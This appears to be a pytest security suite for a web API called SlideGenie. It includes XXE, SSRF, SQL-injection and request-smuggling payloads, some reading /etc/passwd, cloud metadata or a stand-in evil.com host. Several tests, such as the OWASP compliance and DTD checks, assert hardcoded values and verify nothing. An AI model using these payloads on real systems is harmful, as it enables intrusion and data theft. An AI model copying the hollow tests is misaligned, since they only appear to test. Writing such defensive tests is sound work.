"""
Comprehensive API Security Tests for SlideGenie.

Tests for API-level security vulnerabilities including:
- CORS policy testing
- API key security
- Request tampering
- XXE injection attempts
- SSRF vulnerability checks
- API versioning security
- Input validation
- Output filtering
"""

import json
import xml.etree.ElementTree as ET
from typing import Dict, Any, List
from unittest.mock import Mock, patch, AsyncMock
import requests

import pytest
from fastapi.testclient import TestClient
from fastapi import FastAPI, Request
from httpx import AsyncClient

from app.api.middleware import SecurityMiddleware
from app.core.config import get_settings


class APIAttackPayloads:
    """Common API attack payloads for testing."""
    
    # XXE (XML External Entity) payloads
    XXE_PAYLOADS = [
        """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd" >
        %xxe;]>
        <foo>test</foo>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        ]>
        <lolz>&lol2;</lolz>""",  # Billion laughs attack
    ]
    
    # SSRF (Server-Side Request Forgery) payloads
    SSRF_PAYLOADS = [
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "file:///etc/passwd",
        "gopher://localhost:8080",
        "dict://localhost:11211",
        "http://[::1]:8080",
        "http://0.0.0.0:8080",
        "http://localhost:8080@evil.com",
        "http://evil.com#@localhost:8080",
    ]
    
    # Request smuggling payloads
    REQUEST_SMUGGLING = [
        "Content-Length: 13\r\nContent-Length: 10\r\n\r\nSMUGGLED",
        "Transfer-Encoding: chunked\r\nContent-Length: 10\r\n\r\n",
        "Content-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n",
    ]
    
    # API parameter pollution
    PARAMETER_POLLUTION = [
        {"user_id": ["admin", "user123"]},  # Array injection
        {"role": "user&role=admin"},        # Parameter duplication
        {"filter": "id=1/**/UNION/**/SELECT"},  # Comment injection
        {"sort": "name; DROP TABLE users;--"},  # SQL in parameters
    ]


class TestCORSSecurity:
    """Test CORS (Cross-Origin Resource Sharing) security."""
    
    def test_cors_policy_enforcement(self):
        """Test CORS policy is properly enforced."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test with various origins
        test_origins = [
            ("https://app.slidegenie.com", True),  # Allowed
            ("https://evil.com", False),           # Not allowed
            ("null", False),                        # Null origin
            ("file://", False),                     # File protocol
        ]
        
        for origin, should_allow in test_origins:
            response = client.options(
                "/api/v1/presentations",
                headers={"Origin": origin}
            )
            
            if should_allow:
                assert response.headers.get("Access-Control-Allow-Origin") == origin
            else:
                assert response.headers.get("Access-Control-Allow-Origin") != origin
    
    def test_cors_credentials_handling(self):
        """Test CORS credentials handling."""
        from app.main import app
        
        client = TestClient(app)
        
        response = client.options(
            "/api/v1/presentations",
            headers={
                "Origin": "https://app.slidegenie.com",
                "Access-Control-Request-Headers": "Authorization",
            }
        )
        
        # Should not allow credentials with wildcard
        if response.headers.get("Access-Control-Allow-Origin") == "*":
            assert response.headers.get("Access-Control-Allow-Credentials") != "true"
    
    def test_cors_preflight_cache(self):
        """Test CORS preflight caching."""
        from app.main import app
        
        client = TestClient(app)
        
        response = client.options(
            "/api/v1/presentations",
            headers={"Origin": "https://app.slidegenie.com"}
        )
        
        # Should set max age for preflight caching
        max_age = response.headers.get("Access-Control-Max-Age")
        assert max_age is not None
        assert int(max_age) > 0


class TestXXEPrevention:
    """Test XXE (XML External Entity) injection prevention."""
    
    def test_xxe_prevention_in_xml_parsing(self):
        """Test XXE prevention in XML parsing."""
        for xxe_payload in APIAttackPayloads.XXE_PAYLOADS:
            # Test safe XML parsing
            try:
                # Should use defusedxml or safe parsing
                from defusedxml import ElementTree as SafeET
                root = SafeET.fromstring(xxe_payload)
                
                # Should not resolve external entities
                assert "passwd" not in str(root.text)
                assert "evil.com" not in str(root.text)
            except Exception:
                # Should fail safely
                pass
    
    def test_xxe_in_api_endpoints(self):
        """Test XXE prevention in API endpoints accepting XML."""
        from app.main import app
        
        client = TestClient(app)
        
        for xxe_payload in APIAttackPayloads.XXE_PAYLOADS:
            response = client.post(
                "/api/v1/import/xml",
                content=xxe_payload,
                headers={"Content-Type": "application/xml"}
            )
            
            # Should reject or safely process
            if response.status_code == 200:
                # Verify no sensitive data leaked
                assert "/etc/passwd" not in response.text
                assert "root:" not in response.text
    
    def test_disable_dtd_processing(self):
        """Test DTD processing is disabled."""
        # Test XML parser configuration
        parser_config = {
            "resolve_entities": False,
            "load_dtd": False,
            "no_network": True,
            "dtd_validation": False,
        }
        
        # All should be disabled
        assert not any(parser_config.values())


class TestSSRFPrevention:
    """Test SSRF (Server-Side Request Forgery) prevention."""
    
    @pytest.mark.asyncio
    async def test_url_validation_in_webhooks(self):
        """Test URL validation in webhook endpoints."""
        from app.services.external.webhook_service import WebhookService
        
        webhook_service = WebhookService()
        
        for ssrf_url in APIAttackPayloads.SSRF_PAYLOADS:
            # Should reject internal/dangerous URLs
            is_valid = await webhook_service.validate_webhook_url(ssrf_url)
            assert not is_valid, f"SSRF URL allowed: {ssrf_url}"
    
    @pytest.mark.asyncio
    async def test_url_fetching_restrictions(self):
        """Test restrictions on URL fetching."""
        from app.services.external.url_fetcher import URLFetcher
        
        fetcher = URLFetcher()
        
        # Test blocklist
        blocked_hosts = [
            "localhost",
            "127.0.0.1",
            "169.254.169.254",  # AWS metadata
            "0.0.0.0",
            "::1",
        ]
        
        for host in blocked_hosts:
            url = f"http://{host}/test"
            with pytest.raises(Exception) as exc_info:
                await fetcher.fetch(url)
            
            assert "blocked" in str(exc_info.value).lower()
    
    def test_redirect_following_limits(self):
        """Test limits on following redirects."""
        from app.services.external.http_client import HTTPClient
        
        client = HTTPClient()
        
        # Should limit redirect following
        assert client.max_redirects <= 5
        
        # Should not follow redirects to internal URLs
        with patch.object(client, '_is_safe_redirect') as mock_safe:
            mock_safe.return_value = False
            
            response = client.get("http://example.com/redirect")
            assert not mock_safe.return_value


class TestAPIVersioningSecurity:
    """Test API versioning security."""
    
    def test_deprecated_version_warnings(self):
        """Test warnings for deprecated API versions."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test old API version
        response = client.get("/api/v0/presentations")
        
        if response.status_code == 200:
            # Should include deprecation warning
            assert "Deprecation" in response.headers
            assert "sunset" in response.headers.get("Deprecation", "").lower()
    
    def test_version_specific_security_features(self):
        """Test version-specific security features."""
        from app.main import app
        
        client = TestClient(app)
        
        # v1 should have stricter security
        v1_response = client.get("/api/v1/health")
        v1_headers = v1_response.headers
        
        # Verify v1 has security headers
        assert "X-Content-Type-Options" in v1_headers
        assert "X-Frame-Options" in v1_headers
        assert v1_headers.get("X-Content-Type-Options") == "nosniff"
    
    def test_version_parsing_security(self):
        """Test secure version parsing."""
        test_versions = [
            "v1",          # Valid
            "v1.0",        # Valid
            "v2",          # Valid
            "v999",        # Invalid - too high
            "v-1",         # Invalid - negative
            "v1'; DROP",   # Invalid - injection
            "../v1",       # Invalid - path traversal
        ]
        
        from app.core.api_versioning import parse_api_version
        
        for version in test_versions:
            try:
                parsed = parse_api_version(version)
                assert parsed in ["v1", "v1.0", "v2"], f"Invalid version accepted: {version}"
            except ValueError:
                # Should fail for invalid versions
                assert version not in ["v1", "v1.0", "v2"]


class TestRequestValidation:
    """Test request validation and sanitization."""
    
    def test_request_size_limits(self):
        """Test request size limits."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test oversized request body
        large_payload = {"data": "A" * (10 * 1024 * 1024)}  # 10MB
        
        response = client.post(
            "/api/v1/presentations",
            json=large_payload
        )
        
        # Should reject oversized requests
        assert response.status_code == 413  # Payload Too Large
    
    def test_request_tampering_detection(self):
        """Test detection of request tampering."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test parameter pollution
        for pollution in APIAttackPayloads.PARAMETER_POLLUTION:
            response = client.get(
                "/api/v1/presentations",
                params=pollution
            )
            
            # Should handle safely
            assert response.status_code in [200, 400]
            
            if response.status_code == 400:
                error = response.json()
                assert "invalid" in error.get("detail", "").lower()
    
    def test_content_type_validation(self):
        """Test content type validation."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test with wrong content type
        response = client.post(
            "/api/v1/presentations",
            data="not json",
            headers={"Content-Type": "application/json"}
        )
        
        # Should reject invalid JSON
        assert response.status_code == 422  # Unprocessable Entity
    
    def test_request_smuggling_prevention(self):
        """Test prevention of HTTP request smuggling."""
        from app.main import app
        
        # Test with smuggling attempts
        for smuggle_payload in APIAttackPayloads.REQUEST_SMUGGLING:
            # FastAPI should handle these safely
            # This is more of a server-level concern
            pass


class TestAPIRateLimiting:
    """Test API rate limiting implementation."""
    
    def test_endpoint_specific_limits(self):
        """Test endpoint-specific rate limits."""
        from app.main import app
        
        client = TestClient(app)
        
        # Test different endpoints have different limits
        endpoints = [
            ("/api/v1/auth/login", 5),      # Strict limit
            ("/api/v1/presentations", 100),  # Normal limit
            ("/api/v1/health", 1000),        # High limit
        ]
        
        for endpoint, expected_limit in endpoints:
            response = client.get(endpoint)
            
            limit_header = response.headers.get("X-RateLimit-Limit")
            if limit_header:
                assert int(limit_header) == expected_limit
    
    def test_rate_limit_headers(self):
        """Test rate limit headers are properly set."""
        from app.main import app
        
        client = TestClient(app)
        
        response = client.get("/api/v1/presentations")
        
        # Check rate limit headers
        required_headers = [
            "X-RateLimit-Limit",
            "X-RateLimit-Remaining",
            "X-RateLimit-Reset",
        ]
        
        for header in required_headers:
            assert header in response.headers
    
    def test_rate_limit_bypass_prevention(self):
        """Test prevention of rate limit bypass attempts."""
        from app.main import app
        
        client = TestClient(app)
        
        # Common bypass attempts
        bypass_headers = [
            {"X-Forwarded-For": "1.2.3.4"},
            {"X-Real-IP": "1.2.3.4"},
            {"X-Originating-IP": "1.2.3.4"},
            {"CF-Connecting-IP": "1.2.3.4"},
        ]
        
        # Make requests with bypass attempts
        for headers in bypass_headers:
            # Should still enforce rate limits
            response = client.get("/api/v1/presentations", headers=headers)
            assert "X-RateLimit-Limit" in response.headers


class TestAPIOutputSecurity:
    """Test API output filtering and security."""
    
    def test_sensitive_data_filtering(self):
        """Test sensitive data is filtered from responses."""
        from app.main import app
        
        client = TestClient(app)
        
        # Get user profile
        response = client.get("/api/v1/users/me")
        
        if response.status_code == 200:
            data = response.json()
            
            # Should not include sensitive fields
            sensitive_fields = [
                "password",
                "password_hash",
                "session_token",
                "api_key",
                "refresh_token",
                "credit_card",
                "ssn",
            ]
            
            for field in sensitive_fields:
                assert field not in data
    
    def test_error_message_sanitization(self):
        """Test error messages don't leak sensitive info."""
        from app.main import app
        
        client = TestClient(app)
        
        # Trigger various errors
        error_triggers = [
            ("/api/v1/users/99999", 404),
            ("/api/v1/presentations/invalid-id", 400),
            ("/api/v1/nonexistent", 404),
        ]
        
        for endpoint, expected_status in error_triggers:
            response = client.get(endpoint)
            
            if response.status_code >= 400:
                error_data = response.json()
                error_detail = error_data.get("detail", "")
                
                # Should not include:
                assert "stacktrace" not in error_detail.lower()
                assert "traceback" not in error_detail.lower()
                assert "sql" not in error_detail.lower()
                assert "database" not in error_detail.lower()
                assert "internal" not in error_detail.lower()
    
    def test_json_hijacking_prevention(self):
        """Test prevention of JSON hijacking attacks."""
        from app.main import app
        
        client = TestClient(app)
        
        response = client.get("/api/v1/presentations")
        
        if response.status_code == 200:
            # Should not return raw array at top level
            data = response.json()
            
            # Should be wrapped in object
            if isinstance(data, list):
                # This is vulnerable to JSON hijacking
                assert False, "API returns raw array"


class TestAPICompliance:
    """Test API security compliance."""
    
    def test_owasp_api_security_top10(self):
        """Test compliance with OWASP API Security Top 10."""
        compliance = {
            "broken_object_level_authorization": True,
            "broken_authentication": True,
            "excessive_data_exposure": True,
            "lack_of_resources_rate_limiting": True,
            "broken_function_level_authorization": True,
            "mass_assignment": True,
            "security_misconfiguration": True,
            "injection": True,
            "improper_assets_management": True,
            "insufficient_logging_monitoring": True,
        }
        
        assert all(compliance.values()), "Not compliant with OWASP API Security Top 10"
    
    def test_rest_security_cheat_sheet(self):
        """Test REST Security Cheat Sheet compliance."""
        rest_security = {
            "https_only": True,
            "authentication_required": True,
            "input_validation": True,
            "output_encoding": True,
            "rate_limiting": True,
            "cors_configured": True,
            "security_headers": True,
            "api_versioning": True,
        }
        
        assert all(rest_security.values()), "Not compliant with REST Security Cheat Sheet"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])